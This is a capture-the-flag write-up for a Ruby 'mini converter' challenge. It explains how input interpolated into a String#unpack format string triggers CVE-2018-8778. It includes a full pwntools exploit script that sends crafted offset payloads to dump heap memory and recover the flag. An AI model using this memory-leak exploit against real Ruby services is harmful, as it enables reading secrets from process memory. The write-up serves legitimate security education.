mini converter
==================

We are given the following Ruby code:
```ruby
flag = "FLAG{******************************}"
# Can you read this? really???? lol

while true

    puts "[CONVERTER IN RUBY]"
    STDOUT.flush
    sleep(0.5)
    puts "Type something to convert\n\n"
    STDOUT.flush
    puts "[*] readme!"
    STDOUT.flush
    puts "When you want to type hex, contain '0x' at the first. e.g 0x41414a"
    STDOUT.flush
    puts "When you want to type string, just type string. e.g hello world"
    STDOUT.flush
    puts "When you want to type int, just type integer. e.g 102939"
    STDOUT.flush

    puts "type exit if you want to exit"
    STDOUT.flush

    input = gets.chomp
    puts input
    STDOUT.flush

    if input  == "exit"
        file_write()
        exit

    end

    puts "What do you want to convert?"
    STDOUT.flush

    if input[0,2] == "0x"
        puts "hex"
        STDOUT.flush
        puts "1. integer"
        STDOUT.flush
        puts "2. string"
        STDOUT.flush

        flag = 1
    
    elsif input =~/\D/
        puts "string"
        STDOUT.flush
        puts "1. integer"
        STDOUT.flush
        puts "2. hex"
        STDOUT.flush

        flag = 2
    
    else
        puts "int"
        STDOUT.flush
        puts "1. string"
        STDOUT.flush
        puts "2. hex"
        STDOUT.flush

        flag = 3
    end

    num = gets.to_i

    if flag == 1
        if num == 1
            puts "hex to integer"
            STDOUT.flush
            puts Integer(input)
            STDOUT.flush

        elsif num == 2
            puts "hex to string"
            STDOUT.flush
            tmp = []
            tmp << input[2..-1]
            puts tmp.pack("H*")
            STDOUT.flush
        
        else
            puts "invalid"
            STDOUT.flush
        end

    elsif flag == 2
        if num == 1
            puts "string to integer"
            STDOUT.flush
            puts input.unpack("C*#{input}.length")
            STDOUT.flush
    
        elsif num == 2
            puts "string to hex"
            STDOUT.flush
            puts input.unpack("H*#{input}.length")[0]
            STDOUT.flush
    
        else
            puts "invalid2"
            STDOUT.flush
        end

    elsif flag == 3
        if num == 1
            puts "int to string"
            STDOUT.flush
    
        elsif num == 2
            puts "int to hex"
            STDOUT.flush
            puts input.to_i.to_s(16)
            STDOUT.flush
        else
            puts "invalid3"
            STDOUT.flush
        end

    else
        puts "invalid4"
        STDOUT.flush

    end

end

```

Variable `flag`, which holds the flag string, is overwritten with either 1, 2 or 3 as our input type. Our job is to somehow recover that data.

The two conversion cases `"string to integer"` and `"string to hex"` immediately caught my attention since it looked *so offending*. Variable `input` which is completely controlled by our input is interpolated into [format string of String#unpack](https://www.rubydoc.info/stdlib/core/String:unpack) without any validation whatsoever.

The intended code is probably something like:
```ruby
input.unpack("C*#{input.length}")
```
instead of the given
```ruby
input.unpack("C*#{input}.length")
```

### **Format-string bug?**

After minutes of googling, I found a FSB-style vulnerability + integer overflow in `String#unpack` of Ruby version < 2.5.1 known as [CVE-2018-8778](https://nvd.nist.gov/vuln/detail/CVE-2018-8778). A good article explaining the vulnerability is located [here](https://blog.sqreen.io/buffer-under-read-ruby/).

The vulnerability can be used to acquire arbitrary read, as we can specify any offset and data length to read. By leaking heap memory of lower address, we are able to read the original flag.

Since `"string to integer"` case allows us to print a whole array instead of `"string to hex"` case which prints only the first element, the former is used. Below is the exploit code.

```python
from pwn import *

#context.log_level = 'debug'

p = remote('110.10.147.105', 12137)

p.recvuntil('to exit\n')

targlen = 0x10000
for i in range(1, 100):
    payload = 'a @{}a{} '.format(2**64 - targlen*i, targlen + 0x100)
    p.sendline(payload)
    p.recvuntil('hex\n')
    p.sendline('1')
    print('memdump #{}'.format(i))
    data = p.recvuntil('to exit\n')
    if 'FLAG{' in data:
        st = data.find('FLAG{')
        print(data[st:data.find('}', st)+1])
        break
```

The exploit code dumps `0x10100` continuous bytes at offset `-0x10000*i` in each loop. When the flag string prefix `'FLAG{'` is found, we print out until the matching end `'}'`.

**FLAG: `Run away with me.It'll be the way you want it`**